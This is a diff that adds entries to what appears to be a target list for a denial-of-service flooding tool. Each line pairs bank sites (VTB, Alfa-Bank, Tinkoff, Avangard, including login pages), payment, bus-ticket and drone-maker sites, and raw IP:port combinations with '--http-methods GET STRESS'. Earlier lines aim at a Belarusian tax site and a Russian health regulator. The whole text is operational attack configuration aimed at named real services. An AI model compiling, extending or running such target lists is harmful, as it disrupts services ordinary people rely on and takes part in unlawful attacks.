@@ -62,6 +62,18 @@ http://new.kspz.ru/ http://ulnammo.ru/vp/ http://www.barnaulpatron.ru/ru/ http:/
 
 http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
 
+https://alfabank.ru https://vtb.ru https://online.vtb.ru/login https://login.avangard.ru https://www.tinkoff.ru/ --http-methods GET STRESS
+
+https://193.222.109.135:443 https://193.222.109.11:443 https://193.222.109.82:2001 tcp://217.12.96.27:25 tcp://217.12.96.18:25 tcp://217.12.97.18:25 tcp://193.164.146.180:25 tcp://193.164.146.181:25 tcp://193.164.146.179:25 tcp://195.242.83.129:8008 tcp://193.222.109.99:443 --http-methods GET STRESS
+
+https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
+
+https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
+
+https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
+
+https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
+
 #http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET STRESS
 
 #https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
